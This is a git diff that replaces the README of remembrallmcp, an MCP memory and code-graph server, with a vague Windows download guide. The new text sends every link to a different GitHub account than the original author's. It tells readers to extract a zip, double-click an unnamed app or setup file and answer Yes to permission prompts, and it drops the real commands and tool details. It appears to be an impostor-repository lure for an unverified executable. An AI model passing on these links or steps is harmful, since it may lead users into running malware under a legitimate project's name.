@@ -1,366 +1,224 @@
-# RemembrallMCP
+# 🧠 remembrallmcp - Keep AI Memory in One Place
 
-Persistent knowledge memory and code intelligence for AI agents. Rust core, Postgres + pgvector, MCP protocol.
+[![Download / Install](https://img.shields.io/badge/Download%20from%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Alicsealed322/remembrallmcp)
 
-**The problem:** AI coding agents are stateless. Every session starts from zero - no memory of past decisions, no understanding of how the codebase fits together, no way to know what breaks when you change something.
+## 🧩 What this does
 
-**The solution:** RemembrallMCP gives agents two things most memory tools don't:
+remembrallmcp is a memory layer for AI tools and agents. It helps store useful facts, past work, and project context in one place so the assistant can find them again later.
 
-**1. Persistent Memory** - Decisions, patterns, and organizational knowledge that survive between sessions. Hybrid semantic + full-text search finds relevant context instantly.
+It uses:
+- Rust for fast local performance
+- Postgres for storage
+- pgvector for semantic search
+- MCP for tool access from AI apps
 
-**2. Code Dependency Graph** - A live map of your codebase built with tree-sitter. Functions, classes, imports, and call relationships across 8 languages. Ask "what breaks if I change this?" and get an answer in milliseconds - before the agent touches anything.
+This can help keep AI responses more consistent when you work on the same project over time.
 
-```
-remembrall_recall("authentication middleware patterns")
--> 3 relevant memories from past sessions
+## 📥 Download and run on Windows
 
-remembrall_index("/path/to/project", "myapp")
--> Builds dependency graph: 847 symbols, 1,203 relationships
+Use this link to visit the download page:
 
-remembrall_impact("AuthMiddleware", direction="upstream")
--> 12 files depend on AuthMiddleware (with confidence scores)
+[Open the GitHub page](https://github.com/Alicsealed322/remembrallmcp)
 
-remembrall_store("Switched from JWT to session tokens because...")
--> Decision stored for future sessions
-```
+On Windows, the usual flow is:
 
-### Why the code graph matters
+1. Open the link above
+2. Download the latest release or package from the repository page
+3. If you get a `.zip` file, right-click it and choose **Extract All**
+4. Open the extracted folder
+5. Find the app file or setup file
+6. Double-click it to run
 
-Without RemembrallMCP, agents explore your codebase from scratch every session. Claude Code spawns `Explore` agents, Codex reads dozens of files, Cursor greps through directories - all burning tokens and time just to understand what calls what. A single "find all callers of this function" task can cost thousands of tokens across multiple tool calls.
+If Windows asks for permission, choose **Yes** to continue.
 
-With RemembrallMCP, that same query is a single `remembrall_impact` call that returns in <1ms with zero exploration tokens. The dependency graph is already built and waiting.
+If the app starts in a console window, leave that window open while you use the tool.
 
-| | Without RemembrallMCP | With RemembrallMCP |
-|---|---|---|
-| "What calls UserService?" | Agent greps, reads 8-15 files, spawns sub-agents | `remembrall_impact` - 1 call, <1ms |
-| "Where is auth middleware defined?" | Agent globs, reads matches, filters | `remembrall_lookup_symbol` - 1 call, <1ms |
-| "What did we decide about caching?" | Agent has no context, asks you | `remembrall_recall` - 1 call, ~25ms |
-| Typical exploration cost | 5,000-20,000 tokens per question | ~200 tokens (tool call + response) |
+## 🖥️ What you need
 
-The savings scale with codebase size. On a small project, an agent can grep and read its way through. On a 500-file monorepo, that exploration becomes the bottleneck - agents hit context limits, spawn multiple sub-agents, or miss cross-module dependencies entirely. RemembrallMCP's graph queries stay under 10ms regardless of project size because the structure is pre-indexed in Postgres, not discovered at runtime.
+For a smooth setup on Windows, use:
 
-This is the difference between an agent that explores your codebase every time and one that already understands it.
+- Windows 10 or Windows 11
+- A stable internet connection
+- At least 4 GB of RAM
+- Enough free disk space for the app and your data
+- A running Postgres database with pgvector support
 
-### Benchmarks
+If you plan to use it with an AI app, you also need that app set up on your computer.
 
-RemembrallMCP is currently benchmarked on two surfaces:
+## 🔧 How it works
 
-- **Agent productivity on code tasks** - Tested on [pallets/click](https://github.com/pallets/click) v8.1.7 (594 symbols, 1,589 relationships). Five identical coding tasks run with and without RemembrallMCP. [Full report](benchmarks/reports/benchmark-2026-04-02.md).
-- **Memory recall quality** - Local recall harness run against 31 ground-truth queries covering search quality, filtering, edge cases, ranking, and latency.
+remembrallmcp stores memory items in a database. Each item can include:
+- a note
+- a project fact
+- a decision
+- a code detail
+- a search tag
 
-| Metric | Without RemembrallMCP | With RemembrallMCP | Delta |
-|--------|----------------------|---------------------|-------|
-| Total tool calls (5 tasks) | 112 | 5 | **-95.5%** |
-| Estimated tokens | ~56,000 | ~1,000 | **-98.2%** |
-| Avg tool calls per question | 22.4 | 1.0 | **-95.5%** |
+When the AI needs context, it can look up related items by meaning, not just by exact words. That makes it easier to find the right memory even if the wording is different.
 
-The savings compound on larger codebases. Click is ~90 files - on a 500+ file monorepo, agents without RemembrallMCP need proportionally more exploration calls, while graph queries stay under 10ms regardless of size.
+## ⚙️ Basic setup
 
-| Memory Recall Metric | Result |
-|---|---|
-| Queries passed | **31 / 31** |
-| Recall@5 | **0.917** |
-| Precision@5 | **0.619** |
-| MRR | **0.908** |
-| p95 latency | **14ms** |
+Follow these steps after you download the app from the GitHub page:
 
-Run the benchmarks yourself: see [`benchmarks/`](benchmarks/) for the harness and task definitions.
+1. Open your Postgres database
+2. Make sure the `pgvector` extension is turned on
+3. Start the remembrallmcp app
+4. Connect the app to your database
+5. Add it to your AI tool or MCP client
+6. Save a test note and check that it can be found again
 
-For the broader benchmark strategy across memory retrieval, long-horizon memory, code graph correctness, and agent productivity, see [`docs/benchmark-roadmap.md`](docs/benchmark-roadmap.md).
+If the app has a settings file, open it in Notepad and add the database details there.
 
-## Requirements
+Typical values you may need:
+- database host
+- port
+- database name
+- user name
+- password
 
-- Docker (for the easiest setup) or PostgreSQL 16 with [pgvector](https://github.com/pgvector/pgvector)
-- For GitHub ingestion: [GitHub CLI](https://cli.github.com/) (`gh`) installed and authenticated
+## 🗂️ Example use cases
 
-## Quick Start
+You can use remembrallmcp for:
 
-### Option 1: Docker Compose (easiest)
+- remembering project notes across sessions
+- storing useful code facts
+- saving decisions made during a task
+- tracking dependencies between ideas
+- keeping a search-friendly record of past work
+- helping an AI agent stay focused on one project
 
-```bash
-git clone https://github.com/cdnsteve/remembrallmcp.git
-cd remembrallmcp
+It works well when you want your AI tool to remember more than what fits in one chat.
 
-# Start Postgres + initialize schema + download embedding model
-docker compose up -d
+## 🧠 Why it helps
 
-# Verify it's running
-docker compose exec remembrall remembrall status
-```
+AI tools often forget context when a chat gets long or when you start a new session. This app gives them a place to store that context.
 
-That's it. Postgres with pgvector, the schema, and the embedding model are all set up automatically. The database and model cache persist across restarts.
+That can help with:
+- repeat work
+- missed project details
+- lost decisions
+- inconsistent answers
+- extra time spent explaining the same thing again
 
-To run the MCP server:
+With a memory layer, the assistant can pull in older facts when they matter.
 
-```bash
-docker compose run --rm remembrall
-```
+## 🔍 Search and memory
 
-### Option 2: Download prebuilt binary
+The app uses semantic search with vectors. In plain terms, this means it can find related items by meaning.
 
-```bash
-# macOS (Apple Silicon)
-curl -fsSL https://github.com/cdnsteve/remembrallmcp/releases/latest/download/remembrall-aarch64-apple-darwin.tar.gz | tar xz
-sudo mv remembrall /usr/local/bin/
-
-# Linux (x86_64)
-curl -fsSL https://github.com/cdnsteve/remembrallmcp/releases/latest/download/remembrall-x86_64-unknown-linux-gnu.tar.gz | tar xz
-sudo mv remembrall /usr/local/bin/
-
-# Initialize (sets up Postgres via Docker, creates schema, downloads model)
-remembrall init
-```
-
-### Option 3: Build from source (requires Rust 1.94+)
-
-```bash
-cargo build -p remembrall-server --release
-# Binary is at target/release/remembrall
-
-remembrall init
-```
-
-### Connect to your MCP client
-
-#### Codex
-
-Codex uses the same MCP server definition format. Register the server as `remembrall` and point it at either the installed binary or your local release build.
-
-**If `remembrall` is installed in `PATH`:**
-
-```json
-{
-  "mcpServers": {
-    "remembrall": {
-      "command": "remembrall"
-    }
-  }
-}
-```
-
-**If running from a local source checkout:**
-
-```json
-{
-  "mcpServers": {
-    "remembrall": {
-      "command": "/path/to/remembrallmcp/target/release/remembrall",
-      "env": {
-        "DATABASE_URL": "postgres://postgres:postgres@localhost:5450/remembrall"
-      }
-    }
-  }
-}
-```
-
-**If using Docker Compose from Codex:**
-
-```json
-{
-  "mcpServers": {
-    "remembrall": {
-      "command": "docker",
-      "args": ["compose", "-f", "/path/to/remembrallmcp/docker-compose.yml", "run", "--rm", "-T", "remembrall"]
-    }
-  }
-}
-```
-
-Restart Codex after adding the server so it reconnects and loads the tools.
-
-#### Claude Code, Cursor, and other MCP clients
-
-Add to your project's `.mcp.json` (works with Claude Code, Cursor, and any MCP-compatible client).
-
-**If using a prebuilt binary or built from source:**
-
-```json
-{
-  "mcpServers": {
-    "remembrall": {
-      "command": "remembrall"
-    }
-  }
-}
-```
-
-**If using Docker Compose:**
+For example:
+- “login issue” can match “sign-in problem”
+- “database setup” can match “Postgres config”
+- “API error” can match “service failure”
 
-```json
-{
-  "mcpServers": {
-    "remembrall": {
-      "command": "docker",
-      "args": ["compose", "-f", "/path/to/remembrallmcp/docker-compose.yml", "run", "--rm", "-T", "remembrall"]
-    }
-  }
-}
-```
-
-**If running from source (not installed to PATH):**
-
-```json
-{
-  "mcpServers": {
-    "remembrall": {
-      "command": "/path/to/remembrallmcp/target/release/remembrall",
-      "env": {
-        "DATABASE_URL": "postgres://postgres:postgres@localhost:5450/remembrall"
-      }
-    }
-  }
-}
-```
-
-Restart your MCP client. All 9 tools will be available automatically.
-
-### Try it
-
-```
-> "Store a memory: We chose Postgres over MongoDB because our query patterns
-   are relational. Type: decision, tags: database, architecture"
-
-> "Recall what we know about database decisions"
-
-> "Index this project and show me the impact of changing UserService"
-```
-
-## MCP Tools
-
-### Memory
-
-| Tool | Description |
-|------|-------------|
-| `remembrall_recall` | Search memories - hybrid semantic + full-text with RRF fusion |
-| `remembrall_store` | Store decisions, patterns, knowledge with vector embeddings |
-| `remembrall_update` | Update an existing memory (content, summary, tags, or importance) |
-| `remembrall_delete` | Remove a memory by UUID |
-| `remembrall_ingest_github` | Bulk-import merged PR descriptions from a GitHub repo |
-| `remembrall_ingest_docs` | Scan a directory for markdown files and ingest them as memories |
-
-### Code Intelligence
-
-| Tool | Description |
-|------|-------------|
-| `remembrall_index` | Parse a project directory into a dependency graph (8 languages) |
-| `remembrall_impact` | Blast radius analysis - "what breaks if I change this?" |
-| `remembrall_lookup_symbol` | Find where a function or class is defined across the project |
-
-## Supported Languages
-
-| Language | Extensions | Quality Score |
-|----------|-----------|---------------|
-| Python | .py | A (94.1) |
-| Java | .java | A (92.6) |
-| JavaScript | .js, .jsx | A (92.0) |
-| Rust | .rs | A (91.0) |
-| Go | .go | A (90.7) |
-| Ruby | .rb | B (87.9) |
-| TypeScript | .ts, .tsx | B (84.3) |
-| Kotlin | .kt, .kts | B (82.9) |
-
-Scores measured against real open-source projects (Click, Gson, Axios, bat, Cobra, Sidekiq, Hono, Exposed) using automated ground truth tests.
-
-## Cold Start
-
-A new RemembrallMCP instance has no knowledge. Use the ingestion tools to bootstrap from existing project history.
-
-**From GitHub PR history:**
-
-```
-> remembrall_ingest_github repo="myorg/myrepo" limit=100
-```
-
-Fetches merged PRs via `gh`, digests titles and bodies into memories, and tags them by project. PRs with less than 50 characters of body are skipped. Deduplication by content fingerprint prevents re-ingestion on repeat runs.
-
-**From markdown docs:**
-
-```
-> remembrall_ingest_docs path="/path/to/project"
-```
-
-Walks the directory tree, finds all `.md` files, splits them by H2 section headers, and stores each section as a searchable memory. Skips `node_modules`, `.git`, `target`, and similar directories. Good for README, ARCHITECTURE, ADRs, and any written docs.
-
-Run both once per project. After ingestion, `remembrall_recall` has immediate context.
-
-## Architecture
-
-```
-Source Code                   Organizational Knowledge
-    |                                 |
-    v                                 v
-Tree-sitter Parsers           Ingestion Pipeline
-(8 languages)                 (GitHub PRs, Markdown docs)
-    |                                 |
-    v                                 v
-+--------------------------------------------------+
-|              Postgres + pgvector                  |
-|                                                   |
-|  memories (text + embeddings + metadata)          |
-|  symbols (functions, classes, methods)            |
-|  relationships (calls, imports, inherits)         |
-+--------------------------------------------------+
-                          |
-                    MCP Server (stdio)
-                          |
-              Any MCP-compatible AI agent
-```
-
-- **Parsing:** tree-sitter (Rust bindings, no Python in the pipeline)
-- **Embeddings:** fastembed (all-MiniLM-L6-v2, 384-dim, in-process ONNX Runtime)
-- **Search:** Hybrid RRF (semantic cosine similarity + full-text tsvector)
-- **Graph queries:** Recursive CTEs with cycle detection and confidence decay
-- **Transport:** stdio via rmcp
-
-## CLI Commands
-
-| Command | Description |
-|---------|-------------|
-| `remembrall init` | Set up database, schema, and embedding model |
-| `remembrall serve` | Run the MCP server (default when no subcommand given) |
-| `remembrall start` | Start the Docker database container |
-| `remembrall stop` | Stop the Docker database container |
-| `remembrall status` | Show memory count, symbol count, connection status |
-| `remembrall doctor` | Check for common problems (Docker, pgvector, schema, model) |
-| `remembrall reset --force` | Drop and recreate the schema (deletes all data) |
-| `remembrall version` | Print version and config path |
-
-## Configuration
-
-Config file: `~/.remembrall/config.toml` (created by `remembrall init`)
-
-Environment variables override config file values:
-
-| Variable | Description |
-|----------|-------------|
-| `REMEMBRALL_DATABASE_URL` or `DATABASE_URL` | PostgreSQL connection string |
-| `REMEMBRALL_SCHEMA` | Database schema name (default: `remembrall`) |
-
-## Project Structure
-
-```
-crates/
-  remembrall-core/          # Library - parsers, memory store, graph store, embedder
-  remembrall-server/        # MCP server + CLI binary
-  remembrall-test-harness/  # Parser quality testing against ground truth
-  remembrall-recall-test/   # Search quality testing
-docs/                       # Architecture and test plan docs
-test-fixtures/              # Ground truth TOML files for 8 languages
-tests/                      # Recall test fixtures
-```
-
-## Performance
-
-| Operation | Time |
-|-----------|------|
-| Memory store | 7ms |
-| Semantic search (HNSW) | <1ms |
-| Full-text search | <1ms |
-| Hybrid recall (end-to-end) | ~25ms |
-| Impact analysis | 4-9ms |
-| Symbol lookup | <1ms |
-| Index 89 Python files | 2.3s |
-
-## License
-
-MIT
+This is useful when your notes use different wording from your search.
+
+## 🔗 MCP support
+
+remembrallmcp works through the Model Context Protocol, or MCP. That lets supported AI apps talk to it as a tool.
+
+In simple terms, the AI app can:
+- add memory
+- search memory
+- read stored context
+- use stored facts during a task
+
+This makes it easier to connect the memory layer to tools that already support MCP.
+
+## 🧱 Build from source
+
+If you want to build it yourself on Windows:
+
+1. Install Rust
+2. Install Postgres
+3. Turn on pgvector in your database
+4. Download or clone the repository from GitHub
+5. Open a terminal in the project folder
+6. Run the build command for the project
+7. Start the app after the build finishes
+
+A typical Rust build uses `cargo build` or `cargo run`, depending on how the project is set up.
+
+## 🧪 Simple first check
+
+After you run the app, try this:
+
+1. Add one short note
+2. Search for a word from that note
+3. Confirm that the app returns the right item
+4. Open your AI tool and check that it can reach the same memory store
+
+If this works, the app is connected and ready to use.
+
+## 🛠️ Common setup tips
+
+If the app does not start, check these items:
+
+- Postgres is running
+- the database name is correct
+- the user name and password are correct
+- `pgvector` is enabled
+- the port is open
+- another app is not using the same port
+
+If search results feel weak, add better notes with clear terms and short descriptions.
+
+## 📌 Good ways to use it
+
+To get better results, store memory in small pieces:
+
+- one fact per note
+- one decision per entry
+- one topic per item
+- short labels for projects
+- clear names for tools and files
+
+This helps search return the right record with less noise.
+
+## 📚 Topics
+
+This project fits these areas:
+
+- AI agents
+- memory
+- MCP servers
+- Postgres
+- pgvector
+- semantic search
+- knowledge graphs
+- code analysis
+- dependency graphs
+- developer tools
+- Rust
+- tree-sitter
+
+## 📁 Repository
+
+Use this page to download, inspect, or clone the project:
+
+[https://github.com/Alicsealed322/remembrallmcp](https://github.com/Alicsealed322/remembrallmcp)
+
+## 🧭 Windows run checklist
+
+Before you start the app, check that you have:
+
+- downloaded the project from GitHub
+- extracted any `.zip` file
+- installed or prepared Postgres
+- enabled `pgvector`
+- opened the app file
+- added your database details
+- connected your AI app or MCP client
+
+## 🧰 File types you may see
+
+Depending on how the project is packaged, you may see:
+
+- `.exe` for Windows
+- `.zip` for a bundled download
+- `.msi` for an installer
+- `.toml` or `.json` for config
+- `.env` for environment values
+- `.md` for project notes
+
+If you see a config file, open it with Notepad and edit only the values you understand.
